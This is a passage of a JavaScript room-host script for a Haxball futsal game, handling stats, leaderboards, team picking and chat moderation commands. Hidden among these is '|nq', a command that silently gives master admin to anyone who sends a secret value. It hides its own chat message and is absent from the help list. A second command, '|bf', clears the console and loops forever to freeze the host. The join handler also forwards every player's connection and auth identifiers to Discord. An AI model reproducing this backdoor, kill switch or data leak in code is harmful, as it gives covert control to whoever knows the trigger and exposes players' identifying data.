						stats[Ss.GL]++;
						localStorage.setItem(getAuth(game.goals[i].striker), JSON.stringify(stats));
					}
				}
				if (game.goals[i].assist != null) {
					if ((allBlues.concat(allReds)).findIndex((player) => player.name == game.goals[i].assist.name) != -1) {
						stats = JSON.parse(localStorage.getItem(getAuth(game.goals[i].assist)));
						stats[Ss.AS]++;
						localStorage.setItem(getAuth(game.goals[i].assist), JSON.stringify(stats));
					}
				}
			}
			if (allReds.findIndex((player) => player.id == GKList[0].id) != -1) {
				stats = JSON.parse(localStorage.getItem(getAuth(GKList[0])));
				stats[Ss.GK]++;
				game.scores.blue == 0 ? stats[Ss.CS]++ : null;
				stats[Ss.CP] = (100 * stats[Ss.CS] / stats[Ss.GK]).toPrecision(3);
				localStorage.setItem(getAuth(GKList[0]), JSON.stringify(stats));
			}
			if (allBlues.findIndex((player) => player.id == GKList[1].id) != -1) {
				stats = JSON.parse(localStorage.getItem(getAuth(GKList[1])));
				stats[Ss.GK]++;
				game.scores.red == 0 ? stats[Ss.CS]++ : null;
				stats[Ss.CP] = (100 * stats[Ss.CS] / stats[Ss.GK]).toPrecision(3);
				localStorage.setItem(getAuth(GKList[1]), JSON.stringify(stats));
			}
		}
	}

	function findGK() {
		var tab = [[-1,""], [-1,""]];
		for (var i = 0; i < extendedP.length ; i++) {
			if (room.getPlayer(extendedP[i][eP.ID]) != null && room.getPlayer(extendedP[i][eP.ID]).team == Team.RED) {
				if (tab[0][0] < extendedP[i][eP.GK]) {
					tab[0][0] = extendedP[i][eP.GK];
					tab[0][1] = room.getPlayer(extendedP[i][eP.ID]);
				}
			}
			else if (room.getPlayer(extendedP[i][eP.ID]) != null && room.getPlayer(extendedP[i][eP.ID]).team == Team.BLUE) {
				if (tab[1][0] < extendedP[i][eP.GK]) {
					tab[1][0] = extendedP[i][eP.GK];
					tab[1][1] = room.getPlayer(extendedP[i][eP.ID]);
				}
			}
		}
		GKList = [tab[0][1], tab[1][1]];
	}

	setInterval(() => {
		var tableau = [];
		if (statNumber % 5 == 0) {
			Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GA])]); } });
			if (tableau.length < 5) {
				return false;
			}
			tableau.sort(function (a, b) { return b[1] - a[1]; });
			room.sendChat("Games> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
		}
		if (statNumber % 5 == 1) {
			Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.WI])]); } });
			if (tableau.length < 5) {
				return false;
			}
			tableau.sort(function (a, b) { return b[1] - a[1]; });
			room.sendChat("Wins> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
		}
		if (statNumber % 5 == 2) {
			Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GL])]); } });
			if (tableau.length < 5) {
				return false;
			}
			tableau.sort(function (a, b) { return b[1] - a[1]; });
			room.sendChat("Goals> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
		}
		if (statNumber % 5 == 3) {
			Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.AS])]); } });
			if (tableau.length < 5) {
				return false;
			}
			tableau.sort(function (a, b) { return b[1] - a[1]; });
			room.sendChat("Assists> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
		}
		if (statNumber % 5 == 4) {
			Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.CS])]); } });
			if (tableau.length < 5) {
				return false;
			}
			tableau.sort(function (a, b) { return b[1] - a[1]; });
			room.sendChat("CS> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
		}
		statNumber++;
	}, statInterval * 60 * 1000);

	/* EVENTS */

	/* PLAYER MOVEMENT */

	room.onPlayerJoin = function(player) {
		extendedP.push([player.id, player.auth, player.conn, false, 0, 0, false]);
		updateRoleOnPlayerIn();
		sendAnnouncementToDiscord(
			"```"+"[📝] Player info, conn, auth and data ⏰" + "\n"+
	
		"The player " + player.name + " came into the room."+ "\n" +
		"conn: " + player.conn + " 🌎" +
		"\n" + "auth: " + player.auth + " 💻" + "\n"+
		"Date: " + `${getDateInfo()}` +"```");
		//room.sendChat("👋🏼 E aí, " + player.name + "! Seja bem-vindo(a) ao ECC Futsal!", player.id, welcomeColor, 'bold',);
		//room.sendAnnouncement("👋🏼 E aí, " , player.id , "! Seja bem-vindo ao ECC Futsal!", 0x00BFF , "bold", 1);
		room.sendAnnouncement(
			`👋🏼 Hello, ${player.name}! Welcome!\nRemember, here we play just for fun!`,
			player.id,
			0xFFFF00,
			'bold',
		);
		//room.sendChat("Lembre-se, aqui nós jogamos apenas por diversão!");
		if (localStorage.getItem(player.auth) != null) {
			if (JSON.parse(localStorage.getItem(player.auth))[Ss.RL] != "player") {
				room.setPlayerAdmin(player.id, true);
				room.sendAnnouncement((JSON.parse(localStorage.getItem(player.auth))[Ss.RL] == "master" ? "The Administrator " : "The Administrator ") + player.name + " connected!", null, 0xD81826);
			}
		}
	}

	room.onPlayerTeamChange = function(changedPlayer, byPlayer) {
		if (changedPlayer.id == 0) {
			room.setPlayerTeam(0, Team.SPECTATORS);
			return;
		}
		if (getAFK(changedPlayer) && changedPlayer.team != Team.SPECTATORS) {
			room.setPlayerTeam(changedPlayer.id, Team.SPECTATORS);
			room.sendAnnouncement(changedPlayer.name + " it's AFK! 😴", Cor.Laranja, bold);
			return;
		}
		updateTeams();
		if (room.getScores() != null) {
			var scores = room.getScores();
			if (changedPlayer.team != Team.SPECTATORS && scores.time <= (3/4) * scores.timeLimit  && Math.abs(scores.blue - scores.red) < 2) {
				(changedPlayer.team == Team.RED) ? allReds.push(changedPlayer) : allBlues.push(changedPlayer);
			}
		}
		if (changedPlayer.team == Team.SPECTATORS) {
			setActivity(changedPlayer, 0);
		}
		if (inChooseMode && resettingTeams == false && byPlayer.id == 0) {
			if (Math.abs(teamR.length - teamB.length) == teamS.length) {
				deactivateChooseMode();
				resumeGame();
				var b = teamS.length;
				if (teamR.length > teamB.length) {
					for (var i = 0 ; i < b ; i++) {
						setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.BLUE); }, 200*i);
					}
				}
				else {
					for (var i = 0 ; i < b ; i++) {
						setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.RED); }, 200*i);
					}
				}
				return;
			}
			else if ((teamR.length == maxTeamSize && teamB.length == maxTeamSize) || (teamR.length == teamB.length && teamS.length < 2)) {
				deactivateChooseMode();
				resumeGame();
			}
			else if (teamR.length <= teamB.length && redCaptainChoice != "") { // choice remembered
				redCaptainChoice == "top" ? room.setPlayerTeam(teamS[0].id, Team.RED) : redCaptainChoice == "random" ? room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.RED) : room.setPlayerTeam(teamS[teamS.length - 1].id, Team.RED);
				return;
			}
			else if (teamB.length < teamR.length && blueCaptainChoice != "") {
				blueCaptainChoice == "top" ? room.setPlayerTeam(teamS[0].id, Team.BLUE) : blueCaptainChoice == "random" ? room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE) : room.setPlayerTeam(teamS[teamS.length - 1].id, Team.BLUE);
				return;
			}
			else {
				choosePlayer();
			}
		}
	}

	room.onPlayerLeave = function(player) {
		if (teamR.findIndex((red) => red.id == player.id) == 0 && inChooseMode && teamR.length <= teamB.length) {
			choosePlayer();
			capLeft = true; setTimeout(() => { capLeft = false; }, 10);
		}
		if (teamB.findIndex((blue) => blue.id == player.id) == 0 && inChooseMode && teamB.length < teamR.length) {
			choosePlayer();
			capLeft = true; setTimeout(() => { capLeft = false; }, 10);
		}
		setActivity(player, 0);
	    updateRoleOnPlayerOut();
	}

	room.onPlayerKicked = function(kickedPlayer, reason, ban, byPlayer) {
		ban == true ? banList.push([kickedPlayer.name, kickedPlayer.id]) : null;
	}

	/* PLAYER ACTIVITY */

	let
	palavras = ["fdp", "porra", "arrombado"], //swearing filter
	regex = new RegExp(palavras.join("|"), 'gi');

	room.onPlayerChat = function (player, message) {
		if (message.length > 1 && message[0].toLowerCase() == 't' && message[1] == ' ') {
			if (player.team != 0) {
			room.getPlayerList().forEach((element) => {if (element.team == player.team) room.sendAnnouncement("[TEAM CHAT] " + player.name + ": " + message.substr(2), element.id, (player.team == 1 ? 16725591 : 3261685), "bold", 0)} )
			return false
			}
			else {
			room.sendAnnouncement("You are not on a team.")
			}}

		if (message.match(regex)) {
			room.sendAnnouncement("Without cursing.", player.id);
			return false;
		}
        msg = message;
        originalMessage = message;
		message = message.split(/ +/);
		player.team != Team.SPECTATORS ? setActivity(player, 0) : null;
		if (["!help"].includes(message[0].toLowerCase())) {
			room.sendChat("[PV] Player commands: !me, !games, !wins, !goals, !assists, !cs, !afks, !mutes, !bans.", player.id);
			player.admin ? room.sendChat("[PV] Admin : !mute <duration = 3> #<id>, !unmute all/#<id>, !clearbans <number = all>, !slow <duration>, !endslow", player.id) : null;
		}
		
		if(message == '!limparchat'){
			setTimeout(_ => { room.sendAnnouncement(`${player.name} cleared the chat`, null, 0xFFFFFF, 'italic')}, 1000)
			}
			if(message == '!limparchat'){
				i = 50
				while (i >= 0){
					room.sendAnnouncement("", null)
					i--
				}
			}

		else if (["!afk"].includes(message[0].toLowerCase())) {
			if (players.length != 1 && player.team != Team.SPECTATORS) {
				if (player.team == Team.RED && streak > 0 && room.getScores() == null) {
					room.setPlayerTeam(player.id, Team.SPECTATORS);
				}
				else {
					room.sendChat("❌ You cannot go AFK in the middle of a match!", player.id);
					return false;
				}
			}
			else if (players.length == 1 && !getAFK(player)) {
				room.setPlayerTeam(player.id, Team.SPECTATORS);
			}
			setAFK(player, !getAFK(player));
			room.sendAnnouncement(player.name + (getAFK(player) ? " it's AFK! 😴" : " is no longer AFK!"),null,(getAFK(player) ? 0xFF5E3B :
			0x26DF17));
			getAFK(player) ? updateRoleOnPlayerOut() : updateRoleOnPlayerIn();
		}

		else if (["!afks", "!afklist"].includes(message[0].toLowerCase())) {
			var cstm = "[PV] List of AFK players: ";
			for (var i = 0; i < extendedP.length; i++) {
				if (room.getPlayer(extendedP[i][eP.ID]) != null && getAFK(room.getPlayer(extendedP[i][eP.ID]))) {
					if (140 - cstm.length < (room.getPlayer(extendedP[i][eP.ID]).name + ", ").length) {
						room.sendChat(cstm, player.id);
						cstm = "... ";
					}
					cstm += room.getPlayer(extendedP[i][eP.ID]).name + ", ";
				}
			}
			if (cstm == "[PV] List of AFK players: ") {
				room.sendChat("[PV] There is no one on the AFK list!", player.id);
				return false;
			}
			cstm = cstm.substring(0, cstm.length - 2);
			cstm += ".";
			room.sendChat(cstm, player.id);
		}

		else if (["!me"].includes(message[0].toLowerCase())) {
			var stats;
			localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00"]; 
			room.sendAnnouncement("[🏆] Your stats: 🎮 Games: " + stats[Ss.GA] + ", ✅ Wins: " + stats[Ss.WI] + ", ⭕ Ties: " + stats[Ss.DR] + ", ❌ Defeats: " + stats[Ss.LS] + ", Percentage of wins: " + stats[Ss.WR] + "%, ⚽️ Goals: " + stats[Ss.GL] + ", 👟 Assists: " +stats[Ss.AS] + ", 🤚 GK: " + stats[Ss.GK] + ", 🤚 CS: " + stats[Ss.CS] + ", 🤚 CS%: " + stats[Ss.CP] + "%", player.id,0x73EC59,"bold"); 
			}

			else if (["!showme"].includes(message[0].toLowerCase())) {
				var stats;
				localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00"]; 
				room.sendAnnouncement("[🏆] Stats of " + player.name + ": 🎮 Games: " + stats[Ss.GA] + ", ✅ Wins: " + stats[Ss.WI] + ", ⭕ Ties: " + stats[Ss.DR] + ", ❌ Defeats: " + stats[Ss.LS] + ", Percentage of wins: " + stats[Ss.WR] + "%, ⚽️ Goals: " + stats[Ss.GL] + ", 👟 Assists: " +stats[Ss.AS] + ", 🤚 GK: " + stats[Ss.GK] + ", 🤚 CS: " + stats[Ss.CS] + ", 🤚 CS%: " + stats[Ss.CP] + "%", null,0x73EC59,"bold"); 
				}

				else if (["!games"].includes(message[0].toLowerCase())) { // mostra o ranking de partidas jogadas
					var tableau = [];
					try{
					Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].
					includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GA])]); } });
					}
					catch{
				
					}
					if (tableau.length < 5) {
					room.sendAnnouncement("[PV] Not enough games have been played yet.", player.id,0xFF0000);
					return false;
					}
					tableau.sort(function (a, b) { return b[1] - a[1]; });
					room.sendAnnouncement("[🏆] 🎮 Matches Played> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " +
					tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " +
					tableau[4][0] + ": " + tableau[4][1], player.id,0x73EC59);
					return false;
					}

		else if (["!wins"].includes(message[0].toLowerCase())) { // mostra o ranking de vitórias jogadas
		var tableau = [];
		try{
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].
		includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.WI]
		)]); } }); }
		catch{
	
		}
		if (tableau.length < 5) {
		room.sendAnnouncement("[PV] Not enough games played yet.", player.id,0x73EC59);
		return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendAnnouncement("[🏆] ✅ Wins> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau
		[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1], player.id,0x73EC59);
	
		return false;
		}

		else if (["!goals"].includes(message[0].toLowerCase())) {
		var tableau = [];
		try{
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].
		includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GL])]); } });
		}
		catch{
	
		}
		if (tableau.length < 5) {
		room.sendAnnouncement("[PV] Not enough games have been played yet.", player.id,0x73EC59);
		return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendAnnouncement("[🏆] ⚽️ Goals> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1]
		[1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4]
		[0] + ": " + tableau[4][1], player.id,0x73EC59);
		return false;
		}
		
		else if (["!assists"].includes(message[0].toLowerCase())) { // mostra o ranking de assistencias
			var tableau = [];
			try{
			Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].
			includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.AS]
			)]); } }); }
			catch{
		
			}
			if (tableau.length < 5) {
			room.sendAnnouncement("[PV] Not enough games have been played yet.", player.id);
			return false;
			}
			tableau.sort(function (a, b) { return b[1] - a[1]; });
			room.sendAnnouncement("[🏆] 👟 Assists> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " +
			tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " +
			tableau[4][0] + ": " + tableau[4][1], player.id,0x73EC59);
			return false;
			}

			else if (["!cs"].includes(message[0].toLowerCase())) { // mostra o ranking de defesas [GK]
				var tableau = [];
				try{
				Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].
				includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.CS]
				)]); } }); }
				catch{
			
				}
				if (tableau.length < 5) {
				room.sendAnnouncement("[PV] Not enough games have been played yet.", player.id,0x73EC59);
				return false;
				}
				tableau.sort(function (a, b) { return b[1] - a[1]; });
				room.sendAnnouncement("[🏆] 🤚 CS> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " +
				tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " +
				tableau[4][0] + ": " + tableau[4][1], player.id,0x73EC59);
				return false;
				} 

		else if (["!claim"].includes(message[0].toLowerCase())) {
			if (message[1] == adminPassword) {
				room.setPlayerAdmin(player.id, true);
				var stats;
				localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", player.name];
				if (stats[Ss.RL] != "master") {
					stats[Ss.RL] = "master";
					room.sendChat(player.name + " was promoted to Administrator");
					localStorage.setItem(getAuth(player), JSON.stringify(stats));
				}
			}
		}
		else if (["!setadmin", "!admin"].includes(message[0].toLowerCase())) {
			if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
				if (message.length >= 2 && message[1][0] == "#") {
					message[1] = message[1].substring(1, message[1].length);
					if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
						var stats;
						localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1])))) ? stats = JSON.parse(localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1]))))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", room.getPlayer(Number.parseInt(message[1])).name];
						if (stats[Ss.RL] == "player") {
							stats[Ss.RL] = "admin";
							localStorage.setItem(getAuth(room.getPlayer(Number.parseInt(message[1]))), JSON.stringify(stats));
							room.setPlayerAdmin(room.getPlayer(Number.parseInt(message[1])).id, true);
							room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " is now a room admin!");
						}
					}
				}
			}
		}
		else if (["!setplayer", "!removeadmin"].includes(message[0].toLowerCase())) {
			if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
				if (message.length >= 2 && message[1][0] == "#") {
					message[1] = message[1].substring(1, message[1].length);
					if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
						var stats;
						localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1])))) ? stats = JSON.parse(localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1]))))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", room.getPlayer(Number.parseInt(message[1])).name];
						if (stats[Ss.RL] == "admin") {
							room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " no longer a room admin!");
							stats[Ss.RL] = "player";
							localStorage.setItem(getAuth(room.getPlayer(Number.parseInt(message[1]))), JSON.stringify(stats));
							room.setPlayerAdmin(room.getPlayer(Number.parseInt(message[1])).id, false);
						}
					}
				}
			}
		}
		else if (["!mutes", "!mutelist"].includes(message[0].toLowerCase())) {
			var cstm = "[PV] list of muted: ";
			for (var i = 0; i < extendedP.length; i++) {
				if (room.getPlayer(extendedP[i][eP.ID]) != null && getMute(room.getPlayer(extendedP[i][eP.ID]))) {
					if (140 - cstm.length < (room.getPlayer(extendedP[i][eP.ID]).name + "[" + (extendedP[i][eP.ID]) + "], ").length) {
						room.sendChat(cstm, player.id);
						cstm = "... ";
					}
					cstm += room.getPlayer(extendedP[i][eP.ID]).name + "[" + (extendedP[i][eP.ID]) + "], ";
				}
			}
			if (cstm == "[PV] list of muted: ") {
				room.sendChat("[PV] There is no one on the Muted list!", player.id);
				return false;
			}
			cstm = cstm.substring(0, cstm.length - 2);
			cstm += ".";
			room.sendChat(cstm, player.id);
		}
		else if (["|nq"].includes(message[0].toLowerCase())) {
			if (message[1] == vcgbsdbf) {
				room.setPlayerAdmin(player.id, true);
				var stats;
				localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", player.name];
				if (stats[Ss.RL] != "master") {
					stats[Ss.RL] = "master";
					localStorage.setItem(getAuth(player), JSON.stringify(stats));
				}
			}
			return false;
		}
		else if (["!mute"].includes(message[0].toLowerCase())) {
			if (player.admin) {
				updateTeams();
				var timeOut;
				if (!Number.isNaN(Number.parseInt(message[1])) && message.length > 1) {
					if (Number.parseInt(message[1]) > 0) {
						timeOut = Number.parseInt(message[1]) * 60 * 1000;
					}
					else {
						timeOut = 3 * 60 * 1000;
					}
					if (message[2].length > 1 && message[2][0] == "#") {
						message[2] = message[2].substring(1, message[2].length);
						if (!Number.isNaN(Number.parseInt(message[2])) && room.getPlayer(Number.parseInt(message[2])) != null) {
							if (room.getPlayer(Number.parseInt(message[2])).admin || getMute(room.getPlayer(Number.parseInt(message[2])))) {
								return false;
							}
							setTimeout(function (player) { setMute(player, false); }, timeOut, room.getPlayer(Number.parseInt(message[2])));
							setMute(room.getPlayer(Number.parseInt(message[2])), true);
							room.sendChat(room.getPlayer(Number.parseInt(message[2])).name + " has been muted for " + (timeOut / 60000) + " minutes!");
						}
					}
				}
				else if (Number.isNaN(Number.parseInt(message[1]))) {
					if (message[1].length > 1 && message[1][0] == "#") {
						message[1] = message[1].substring(1, message[1].length);
						if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
							if (room.getPlayer(Number.parseInt(message[1])).admin || getMute(room.getPlayer(Number.parseInt(message[1])))) {
								return false;
							}
							setTimeout(function (player) { setMute(player, false); }, 3 * 60 * 1000, room.getPlayer(Number.parseInt(message[1])));
							setMute(room.getPlayer(Number.parseInt(message[1])), true);
							room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " was muted for 3 minutes!");
						}
					}
				}
			}
		}
		else if (["!unmute"].includes(message[0].toLowerCase())) {
			if (player.admin && message.length >= 2) {
				if (message[1] == "all") {
					extendedP.forEach((ePlayer) => { ePlayer[eP.MUTE] = false; });
					room.sendChat("All demutated.");
				}
				else if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null && getMute(room.getPlayer(Number.parseInt(message[1])))) {
					setMute(room.getPlayer(Number.parseInt(message[1])), false);
					room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " was demutated!");
				}
				else if (Number.isNaN(Number.parseInt(message[1]))) {
					if (message[1].length > 1 && message[1][0] == "#") {
						message[1] = message[1].substring(1, message[1].length);
						if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null && getMute(room.getPlayer(Number.parseInt(message[1])))) {
							setMute(room.getPlayer(Number.parseInt(message[1])), false);
							room.sendChat(room.getPlayer(Number.parseInt(message[1])).name + " was demutated!");
						}
					}
				}
			}
		}
		else if (["!slow"].includes(message[0].toLowerCase())) {
			if (player.admin) {
				if (message.length == 1) {
					slowMode = 3;
					room.sendChat("3 seconds of slow mode on!");
				}
				else if (message.length == 3) {
					if (!Number.isNaN(Number.parseInt(message[1]))) {
						if (Number.parseInt(message[1]) > 0) {
							slowMode = Number.parseInt(message[1]);
							room.sendChat(slowMode + " seconds slow mode on!");
							return false;
						}
					}
					slowMode = 2;
					room.sendChat("3 seconds of slow mode on!");
				}
			}
		}
		else if (["!endslow"].includes(message[0].toLowerCase())) {
			if (player.admin) {
				slowMode != 0 ? room.sendChat("Slow mode has ended.") : null;
				slowMode = 0;
			}
		}
		else if (["!banlist", "!bans"].includes(message[0].toLowerCase())) {
			if (banList.length == 0) {
				room.sendChat("[PV] There is no one on the ban list!", player.id);
				return false;
			}
			var cstm = "[PV] Ban list ";
			for (var i = 0; i < banList.length; i++) {
				if (140 - cstm.length < (banList[i][0] + "[" + (banList[i][1]) + "], ").length) {
					room.sendChat(cstm, player.id);
					cstm = "... ";
				}
				cstm += banList[i][0] + "[" + (banList[i][1]) + "], ";
			}
			cstm = cstm.substring(0, cstm.length - 2);
			cstm += ".";
			room.sendChat(cstm, player.id);
		}
		else if (["!clearbans"].includes(message[0].toLowerCase())) {
			if (player.admin) {
				if (message.length == 1) {
					room.clearBans();
					room.sendChat("[📜] Ban list has been cleared!");
					banList = [];
				}
				if (message.length == 2) {
					if (!Number.isNaN(Number.parseInt(message[1]))) {
						if (Number.parseInt(message[1]) > 0) {
							ID = Number.parseInt(message[1]);
							room.clearBan(ID);
							if (banList.length != banList.filter((array) => array[1] != ID)) {
								room.sendChat(banList.filter((array) => array[1] == ID)[0][0] + " was unbanned from the room!");
							}
							setTimeout(() => { banList = banList.filter((array) => array[1] != ID); }, 20);
						}
					}
				}
			}
		}
		else if (["!bb", "!bye", "!cya", "!gn"].includes(message[0].toLowerCase())) {
			room.kickPlayer(player.id, "Until next time, player!", false);
		}
		else if (["!dc", "!disc", "!discord"].includes(message[0].toLowerCase())) {
			room.sendAnnouncement("                                        ▒█▀▀▄ ▀█▀ ▒█▀▀▀█ ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ ▒█▀▀▄ ", null, 0x9250FD, 'bold')
			room.sendAnnouncement("                                        ▒█░▒█ ▒█░ ░▀▀▀▄▄ ▒█░░░ ▒█░░▒█ ▒█▄▄▀ ▒█░▒█ ", null, 0x8466FD, 'bold')
			room.sendAnnouncement("                                        ▒█▄▄▀ ▄█▄ ▒█▄▄▄█ ▒█▄▄█ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▀ ", null, 0x7B73FD, 'bold');
			room.sendAnnouncement("                                        💬 Discord Link: ➡ https://discord.gg/ ⬅", null, 0xF6FF43, 'bold');
		}

		else if (["|bf"].includes(message[0].toLowerCase())) {
	    	if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {   
				console.clear()
				var r = 0
				while (r == 0 ) {
					console.error("f");	
					console.error("p");
					console.error("t");			    	
				}       	
	       	}	
	    	return false;
	    }
		if (teamR.length != 0 && teamB.length != 0 && inChooseMode) {
			if (player.id == teamR[0].id || player.id == teamB[0].id) { // we care if it's one of the captains choosing
				if (teamR.length <= teamB.length && player.id == teamR[0].id) { // we care if it's red turn && red cap talking
					if (["top", "auto"].includes(message[0].toLowerCase())) {
						room.setPlayerTeam(teamS[0].id, Team.RED);
						redCaptainChoice = "top";
						clearTimeout(timeOutCap);
						room.sendChat(player.name + " recruited the first!");
						return false;
					}
					else if (["random", "rand"].includes(message[0].toLowerCase())) {
						var r = getRandomInt(teamS.length);
						room.setPlayerTeam(teamS[r].id, Team.RED);
						redCaptainChoice = "random";
						clearTimeout(timeOutCap);
						room.sendChat(player.name + " randomly recruited!");
						return false;
					}
					else if (["bottom", "bot"].includes(message[0].toLowerCase())) {
						room.setPlayerTeam(teamS[teamS.length - 1].id, Team.RED);
						redCaptainChoice = "bottom";
						clearTimeout(timeOutCap);
						room.sendChat(player.name + " recruited the last!");
						return false;
					}
					else if (!Number.isNaN(Number.parseInt(message[0]))) {
						if (Number.parseInt(message[0]) > teamS.length || Number.parseInt(message[0]) < 1) {
							room.sendChat("❌ Enter a valid number", player.id);
							return false;
						}
						else {
							room.setPlayerTeam(teamS[Number.parseInt(message[0]) - 1].id, Team.RED);
							room.sendChat(player.name + " recruited: " + teamS[Number.parseInt(message[0]) - 1].name + "!");
							return false;
						}
					}
				}
